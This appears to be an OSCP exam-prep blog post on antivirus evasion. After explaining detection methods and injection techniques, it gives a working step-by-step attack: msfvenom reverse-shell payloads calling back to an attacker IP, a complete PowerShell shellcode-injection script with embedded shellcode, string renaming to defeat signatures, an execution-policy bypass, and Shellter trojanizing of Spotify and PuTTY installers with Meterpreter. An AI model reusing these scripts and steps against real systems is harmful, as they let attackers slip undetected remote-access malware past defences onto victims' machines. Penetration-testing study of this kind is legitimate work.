---
title: Antivirus Evasion
date: 2024-03-02 06:30:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Antivirus Evasion tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Antivirus Evasion

Attackers often attempt to disable or otherwise bypass antivirus solutions, which can conduct virus removal, IDS/IPS, website scanners, firewalls, etc.

## Antivirus Software Key Components and Operations

### Known vs Unknown Threats

Anti-v software does signature-based detection on known and specific pieces of malware, which can range from detecting a file hash to a specific binary sequence match.

YARA is a signature language that allows researchers to query VirusTotal or integrate their own signatures into AVs.

Modern AV, like Windows Defender, use Machine Learning that is queried everytime an unknown file is found on a host - meaning they can detect unknown malware. However, ML engines run in the cloud and need an active internet connection, which is often not feasible for internal enterprise servers.

To overcome this, we evolved EDRs, which gather security event telemetry and send it to a SIEM.

## Detection Methods

Signature-Based is a restricted list technology that scans for known malware in a file system, quarantining malicious files. The signature can be a hash of the file itself or a set of patterns, like binary strings/values that belong to a specific piece of malware. However, relying on a file hash is weak as changing just one bit will change a hash.

```console
$ nano malware.txt
  offsec
$ xdd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010

$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt

$ nano malware.txt
  offseC

$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010

$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

Heuristic-Based detection relies on sets of rules and algorithms that determine if an action is benign or malicious, often achieved by stepping through the instruction set of the binary file or disassembling and decompiling the machine code.

Behavior-Based detection dynamically assessses a binary file's behavior by executing the file in an emulated envionrment and searching for malicious behaviors.

Machine-Learning detection uses ML to detect unknown threats. Windows Defender, for example, has a client ML engine and a cloud ML engine that supports when the client engine cannot make a determination.

Let's test some AVs with a popular Metasploit payload using msfvenom.

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=111.111.111.111 LPORT=443 -f exe > binary.exe
```

Upload this file to VirusTotal to review various AV results. To get the file from a Windows host to your machine, leverage your webdav directory we made previously and add the library config file to the Windows target.

## Bypassing Antivirus Detections

AV Evasion typically falls in two categories: on-disk and in-memory. On-disk evasion requires modifying malicious files stored physically on the disk to evade AV file engine detections. However, modern malware often attempts operations in-memory, avoiding the disk. This can help reduce the detection potential. 

### On-Disk Evasion

On-disk malware obfuscation is done in many ways, but one of the earliest ways was to use packers that were designed to reduce the size of exes and actually produce an entirely new binary structure (new hash, successful bypass). Some malware still uses this technique, but AVs can typically detect them now with advanced UPX and other packer detections.

Obfuscators mutate/reorg code to make it hard to reverse engineer, often replacing instructions with similar ones, inserting dead code (irrelevent instructions), reordering or splitting functions, and more. This is actually typically used by software devs to protect their intellectual property. Modern obfuscators have runtime in-memory capabilities, which helps to further avoid detection.

Crypter software alters executable code by adding a decryption stub that restores the original code when executing. The decryption happens in-memory and leaves only encrypted code on-disk. This is foundational in modern malware and is one of the most effective techniques.

The best techniques, however, leverage a combination of all of the above, sometimes also adding anti-reversing, anti-debugging, VM emulation detection, etc. Software protectors were made for legitimate use (e.g., anti-copy), but they can also help us bypass AV.

There are few free tools to help us with this. Try the [Enigma Protector](https://www.enigmaprotector.com/en/home.html).

### In-Memory Evasion

PE Injection (In-Memory Innjection) is commonly used for AV bypass on Windows and focuses on manipulating volatile memory. This technique does not write any files to the disk.

We wil use PowerShell to conduct in-memory injection. Other forms require low-level programming in C/C++.

Remote Process Memory Injection injects a payload into another valid/benign executable. Most often, we use a set of Winodws APIs. Use OpenProcess to obtain a valide HANDLE to a target process which we have perms to access, and then allocate memory in the context of the target process by calling something like VirtualAllocEx (Windows API). After the mem is allocated, copy the payload to the newly allocated memory using WriteProcessMemory, and then the payload is usually executed in memory in a separate thread using CreateRemoteThread (Windows API).

Reflective DLL Injection loads a DLL stored by the attacker in process memory, as opposed to the typical DLL Injection, where a malicious DLL is loaded from disk using the LoadLibrary API. The LoadLibrary module doesn't support loading DLLs from memory, and the Windows OS does not expose APIs that can handle this either, which means choosing this technique requires attackers to write their own version of the API that doesn't rely on a disk-based DLL.

Process Hollowing involves us launching a non-malicious process in a suspended state, then removing the image of the process from memory and replacing it with a malicious executable image. Then, we resume the process and our malware is executed instead of the legit process.

Lastly, in Inline Hooking, we modify memory and introduce a hook, which is an instruction that redirects code execution. The hook must be introduced into a function to force it to point back to our malware. Once our malware is executed, the flow returns back to the modified function and continues execution normally. This technique is often used by rootkits, which aim for deticated and persistent access. Rootkits modify user space, kernel space, or even at lower OS protection rings, like hypervisor or boot. They also require admin privileges, so they are often conducted from an elevated shell or after exploiting a privilege-escalation vuln.

## AV Evasion in Practice

We may results to manual or automated AV evasion.

### Testing for AV Evasion

We should consider public tools a last resort if we don't know our target's AV solution. VirusTotal could be a good check of our stealthy our malware could be, however, most of the AV vendors will run in it their sandboxes quickly and develop detection signatures, hindering our malware. Instead of VirusTotal, use AntiScan.Me, which scans against 30 AVs and does not divulge samples to third-parties. You can scan up to 4 samples a day for free.

If we DO know our target's AV, set up a dedicated VM that resembles the target's environmnent.

ALWAYS MAKE SURE to disable sample submission so that we don't have the same problem as we do with VT. In Windows Defender, do this through Windows Security > Virus & threat protection > Manage Settings and deselect the Automatic sample submission option.

### Evading AV with Thread Injection

For time efficienty, craft an evasion attemp that is specific to the target's AV solution. Here's an Avira Free example.

Launch Avira from the Windows desktop. Go to Security > Protection Options.

Firstly, we should verify the AV is worked as intended. We'll test with Metasploit.

On Kali:

```console
$ cp binary.exe /var/www/html/binary.exe

$ cd ../../../../../var/www/html

$ python3 -m http-server 80
```

On Windows:

```console
C:\Users\offsec>powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.237/binary.exe','binary.exe')
```

After some time, the AV should say the threat was blocked. Let's use  a remote process memory injection technique to avoid this, targeting our currently-running process, PowerShell.

One of the great features of PowerShell is its ability to interact with the Windows API, which lets us implement the in-memory injection process in a PowerShell script (instead of a PE). It's difficult for AV to determine if scripts are malicious if it is running inside an interpreter and the script isn't executable code.

Here's a well known memory injection PS script.

```console
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Let's generate a payload to inset where the script says "[Byte[]]$sc = <place your shellcode here>;
".

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 -f powershell -v sc
```

Copy the output to the $sc variable in the script.

```console
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x2d,0xed,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Now, verify the detection rate of our script. AntiScan.Me does not support ps1 format, so use VT. In this case, VT has some unforunate results for us, so let's make some modifications.

AVs often rely on static string signaturates related to meaningful code portions, like vars or function names. Give the variables more generic names. Below, we changed the Win32 hard-coded class name for the Add-Type cmdlet to iWin32 and renamed our variables from sc and winFunch to var1 and var2.

```console
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$var2 = 
  Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$var1 = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x2d,0xed,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Save this script as bypass.ps1 and transfer it to the target. After it's downloaded, run a Quick Scan to verify it was not detected through Security > Virus Scans > Quick Scan > Scan. If the scan comes back clear, we're good to exploit.

Since our msfvenom payload is for x86, we'll launch PS in x86 and run the script.

```console
> .\bypass.ps1

File C:\Users\offsec\bypass.ps1 cannot be loaded because running scripts is disabled on this system.
```

Scripts are disabled for this system, but we know that PowerShell execution policies are set on a per-user basis, not a per-system basis. Let's try to view and change the policy for our current user. In this instance, we will change the policy globally instead of on a per-script basis. To change the policy per script, use the -ExecutionPolicy Bypass flag when running your script.

Get the current execution policy:

```console
> Get-ExecutionPolicy -Scope CurrentUser
Undefined

> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
he execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```

Success! Set up a listener and run the exploit.

```console
$ nc -lvnp 443
```

```console
> .\bypass.ps1
```

Enjoy your reverse shell.

### Automating the Process

Shellter is a dynamic shellcode injection tool that can help us bypass AV. It's designed to run on Windows, so you need wine.

```console
$ sudo apt install shellter
$ sudo apt install wine
$ sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32
$ shellter
```

Shellter can run in Auto or Manual. In Manual, it will launch the PE and let us manipulate it and conduct highly customizable injection. We'll run Auto. Pass Shellter your benign target exe, like a Spotify installer. (/home/kali/desktop/spotifysetup.exe)

When Shellter finds a good place for payload injection, it asks to enablel Stealth mode, which attempts to restore the execution flow of the PE after we execute our payload. Say yes!

You will see a list of payloads it supports, like Metepreters, Shells, WinExecs, or you can submit a custom payload. If you submit a custom and Stealth mode is on, you must terminate your custom payload by exiting the current thread. In our example case, assume any non-Meterpreter payload fails, so we'll stick with Meterpreter and use Meterpreter_Reverse_TCP.

Submit L for listed payloads. Submit desired payload number. Set the prompted values.

Shellter injects and tests to see if it can reach the first instruction of our payload. In our case, it does.

BEFORE CONTINUING, set up a listener.

```console
$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.237;set LPORT 443;run;"
```

Next, transfer the Spotify exe to the Windows target with the same PowerShell command connecting to our Kali webserver in /var/www/html/...

Perform a Quick Scan again to ensure you were not detected.

Run the installer executable, and watch for your reverse shell!

```console
meterpreter > shell

Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
(c) Microsoft Corporation. All rights reserved.

C:\Users\offsec\Desktop>whoami
whoami
client01\offsec
```

Additional Example 1:

Found an FTP server with anonymous access?

```console
$ ftp 111.111.111.111 -p 21 -A
user: anonymous
pass: anonymous
ftp> binary
```

Use Shellter again this time with a putty.exe and the same Meterpreter shell, then send this injected file to the ftp server.

```console
ftp> put putty.exe
```

Additional Example 2:

See Veil for help with AV Evasion: https://github.com/Veil-Framework/Veil
Can't use executables? Put one in a .bat file: https://cyberarms.wordpress.com/2018/05/29/anti-virus-bypass-with-veil-on-kali-linux/
